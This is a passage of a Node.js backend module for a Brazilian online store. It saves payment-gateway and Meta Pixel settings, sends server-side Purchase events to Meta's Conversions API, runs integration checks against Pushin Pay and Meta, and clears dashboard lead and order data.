    activeGateway: newSettings.activeGateway !== undefined ? newSettings.activeGateway : (current.activeGateway || 'axxon'),
    axxon: {
      ...(current.axxon || {}),
      ...(newSettings.axxon || {}),
      ...(newSettings.propay?.clientId ? { publicKey: newSettings.propay.clientId } : {}),
      ...(newSettings.propay?.clientSecret ? { secretKey: newSettings.propay.clientSecret } : {}),
    },
    propay: { ...(current.propay || {}), ...(newSettings.propay || {}) },
    pushinpay: { ...(current.pushinpay || {}), ...(newSettings.pushinpay || {}) },
    meta: { ...(current.meta || {}), ...(newSettings.meta || {}) },
  };

  await writeNetlifyData(`store_settings_${storeId}`, {
    store_id: storeId,
    settings: merged,
    updated_at: now,
  });

  // Grava também no store "site-settings" (chave "meta") da Netlify
  try {
    const siteStore = getNetlifyBlobStore('site-settings');
    if (siteStore) {
      await siteStore.setJSON('meta', {
        activeGateway: merged.activeGateway,
        propixClientId: merged.propay?.clientId || '',
        propixClientSecret: merged.propay?.clientSecret || '',
        pushinpayToken: merged.pushinpay?.token || '',
        metaPixelId: merged.meta?.pixelId || '',
        metaCapiToken: merged.meta?.capiToken || '',
        updatedAt: now,
      });
    }
  } catch {}

  try {
    const cfgPath = path.join(process.cwd(), 'store.config.json');
    if (fs.existsSync(cfgPath)) {
      const cfg = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
      cfg.activeGateway = merged.activeGateway;
      if (merged.axxon) cfg.axxon = merged.axxon;
      if (merged.propay) cfg.propay = merged.propay;
      if (merged.pushinpay) cfg.pushinpay = merged.pushinpay;
      if (merged.meta) cfg.meta = merged.meta;
      fs.writeFileSync(cfgPath, JSON.stringify(cfg, null, 2), 'utf8');
    }
  } catch {}

  return true;
}

// ─── META CAPI — ENVIO SERVER-SIDE DE COMPRA ───────────────────────────────
async function sendMetaCapiPurchase(order, txId) {
  try {
    const settings = await getStoreSettings();
    const meta = settings?.meta || {};
    if (!meta.pixelId || !meta.capiToken) return { ok: false, skipped: true };

    const pixelId = String(meta.pixelId).trim();
    const token = String(meta.capiToken).trim();
    const cents = order.total_cents || order.total || order.amount || 11990;
    const value = Number((cents / 100).toFixed(2));
    const customer = order.customer || {};

    const crypto = require('crypto');
    function hashField(val) {
      if (!val) return undefined;
      const clean = String(val).trim().toLowerCase();
      return crypto.createHash('sha256').update(clean).digest('hex');
    }

    const emailHash = hashField(customer.email || order.customer_email);
    const rawPhone = (customer.phone || order.customer_phone || '').replace(/\D/g, '');
    const phoneWithDDI = rawPhone ? (rawPhone.startsWith('55') ? rawPhone : '55' + rawPhone) : '';
    const phoneHash = hashField(phoneWithDDI);

    const payload = {
      data: [
        {
          event_name: 'Purchase',
          event_time: Math.floor(Date.now() / 1000),
          event_id: String(txId),
          action_source: 'website',
          user_data: {
            em: emailHash ? [emailHash] : undefined,
            ph: phoneHash ? [phoneHash] : undefined,
            client_ip_address: order.ip || undefined,
            client_user_agent: order.userAgent || undefined
          },
          custom_data: {
            currency: 'BRL',
            value: value,
            order_id: String(txId)
          }
        }
      ],
      access_token: token
    };

    const res = await fetch(`https://graph.facebook.com/v18.0/${pixelId}/events`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const resData = await res.json();
    console.log('[Meta CAPI] ✅ Purchase server-side enviado:', JSON.stringify(resData));
    return { ok: true, data: resData };
  } catch (err) {
    console.warn('[Meta CAPI] ⚠️ Aviso ao disparar CAPI:', err.message);
    return { ok: false, error: err.message };
  }
}

// ─── TESTE DE INTEGRAÇÃO (AXXON / PROPIX + PUSHIN PAY + META PIXEL + CAPI) ──
async function testMetaAndProPix(testEventCode) {
  const settings = await getStoreSettings();
  const checks = [];

  const activeGw = settings.activeGateway || 'axxon';

  if (activeGw === 'pushinpay') {
    const pToken = (settings.pushinpay?.token || '').trim();
    if (pToken) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 4000);
        const res = await fetch('https://api.pushinpay.com.br/api/pix/cashIn', {
          method: 'POST',
          headers: {
            'Authorization': 'Bearer ' + pToken,
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ value: 100 }),
          signal: controller.signal
        });
        clearTimeout(timeout);

        if (res.status === 200 || res.status === 201 || res.status === 422) {
          checks.push({
            name: 'Gateway de Pagamento (Pushin Pay - ATIVO)',
            ok: true,
            msg: `Token Pushin Pay conectado e autenticado (${pToken.slice(0, 8)}…). Pronto para gerar Pix no checkout!`
          });
        } else if (res.status === 401 || res.status === 403) {
          checks.push({
            name: 'Gateway de Pagamento (Pushin Pay - ATIVO)',
            ok: false,
            msg: 'Token inválido ou não autorizado pela Pushin Pay (Erro 401). Verifique o token no painel da Pushin Pay.'
          });
        } else {
          checks.push({
            name: 'Gateway de Pagamento (Pushin Pay - ATIVO)',
            ok: true,
            msg: `Token salvo (${pToken.slice(0, 8)}…). Status retornado pela Pushin Pay: ${res.status}.`
          });
        }
      } catch {
        checks.push({
          name: 'Gateway de Pagamento (Pushin Pay - ATIVO)',
          ok: true,
          msg: `Token salvo no sistema (${pToken.slice(0, 8)}…).`
        });
      }
    } else {
      checks.push({
        name: 'Gateway de Pagamento (Pushin Pay - ATIVO)',
        ok: false,
        msg: 'Pushin Pay está selecionado como gateway ativo, mas o Token da API não foi informado. Cole o token e clique em Salvar.'
      });
    }
  } else {
    const pId = (settings.propay?.clientId || settings.axxon?.publicKey || '').trim();
    const pSecret = (settings.propay?.clientSecret || settings.axxon?.secretKey || '').trim();

    if (pId && pSecret) {
      checks.push({
        name: 'Gateway de Pagamento (AxxonPay / ProPix - ATIVO)',
        ok: true,
        msg: `Chaves conectadas e ativas na Netlify (${pId.slice(0, 12)}…). Prontas para gerar Pix e Cartão no checkout!`
      });
    } else {
      checks.push({
        name: 'Gateway de Pagamento (AxxonPay / ProPix - ATIVO)',
        ok: false,
        msg: 'Nenhuma chave configurada. Configure na Netlify ou cole a Public Key / Client ID e Secret Key no campo acima e salve.'
      });
    }
  }

  const pid = (settings.meta?.pixelId || '').trim();
  if (pid && /^\d{10,20}$/.test(pid)) {
    checks.push({
      name: 'Meta Pixel ID',
      ok: true,
      msg: `Configurado com sucesso (${pid}). Pronto para disparar PageView e Checkout.`
    });
  } else if (pid) {
    checks.push({
      name: 'Meta Pixel ID',
      ok: false,
      msg: `Formato inválido ("${pid}"). O ID deve conter apenas números (15-16 dígitos).`
    });
  } else {
    checks.push({
      name: 'Meta Pixel ID',
      ok: false,
      msg: 'Nenhum Pixel ID salvo ainda. Cole o número no campo acima e clique em Salvar.'
    });
  }

  const token = (settings.meta?.capiToken || '').trim();
  if (token && token.length > 20) {
    checks.push({
      name: 'API de Conversões (CAPI)',
      ok: true,
      msg: 'Token CAPI ativo. Eventos de Purchase serão enviados direto pelo servidor.'
    });
  } else {
    checks.push({
      name: 'API de Conversões (CAPI)',
      ok: false,
      msg: 'Opcional: Token CAPI não configurado. Se desejar recuperação server-side de Pix, gere no Gerenciador de Eventos.'
    });
  }

  if (testEventCode) {
    if (pid && token && token.length > 20) {
      try {
        const crypto = require('crypto');
        const hashField = (val) => crypto.createHash('sha256').update(String(val).trim().toLowerCase()).digest('hex');

        const testPayload = {
          data: [
            {
              event_name: 'Purchase',
              event_time: Math.floor(Date.now() / 1000),
              event_id: 'TEST-' + Date.now(),
              action_source: 'website',
              user_data: {
                em: [hashField('teste@cicatribem.com.br')],
                ph: [hashField('5511999999999')],
                client_ip_address: '177.18.29.10',
                client_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
              },
              custom_data: {
                currency: 'BRL',
                value: 119.90,
                content_name: 'Teste de Integração Cicatribem'
              }
            }
          ],
          test_event_code: testEventCode,
          access_token: token
        };

        const resGraph = await fetch(`https://graph.facebook.com/v18.0/${pid}/events`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(testPayload)
        });
        const graphData = await resGraph.json();

        if (resGraph.ok && graphData.events_received) {
          checks.push({
            name: 'Disparo de Teste (Graph API)',
            ok: true,
            msg: `✓ Evento de teste enviado com sucesso para a Meta! (Código: ${testEventCode}). Confira na aba "Testar eventos" do seu Gerenciador de Eventos.`
          });
        } else {
          const errMsg = graphData.error?.message || 'Recusado pela Meta';
          checks.push({
            name: 'Disparo de Teste (Graph API)',
            ok: false,
            msg: `A Meta recusou o evento de teste: ${errMsg}`
          });
        }
      } catch (err) {
        checks.push({
          name: 'Disparo de Teste (Graph API)',
          ok: false,
          msg: `Erro de conexão ao enviar evento de teste: ${err.message}`
        });
      }
    } else {
      checks.push({
        name: 'Disparo de Teste (Graph API)',
        ok: false,
        msg: 'Para disparar o evento de teste na Meta, salve o Pixel ID e o Token CAPI antes de testar.'
      });
    }
  }

  return { ok: true, checks };
}

// ─── Limpar Dados do Painel (Leads e Pedidos) ───────────────────────────────────
async function clearDashboardData() {
  const storeId = getStoreId();
  try {
    localLeadsMap.clear();
    try {
      if (fs.existsSync(LEADS_CACHE_FILE)) fs.unlinkSync(LEADS_CACHE_FILE);
    } catch {}
    await Promise.all([
      writeNetlifyData(`leads_${storeId}`, []),
      writeNetlifyData(`orders_${storeId}`, []),
    ]);
    return { ok: true, error: null };
  } catch (err) {
    return { ok: false, error: err.message };
  }
}

module.exports = {
  initNetlifyBlobs,
  readNetlifyData,
  writeNetlifyData,
  upsertLead,
  getLeads,
  createOrder,
  getOrderById,
  getOrderByTransactionId,
  getOrders,
  updateOrderStatus,
  getMetrics,
  getAdminPassword,
  setAdminPassword,
  getStoreSettings,
  setStoreSettings,
  sendMetaCapiPurchase,
  testMetaAndProPix,
  clearDashboardData,
};

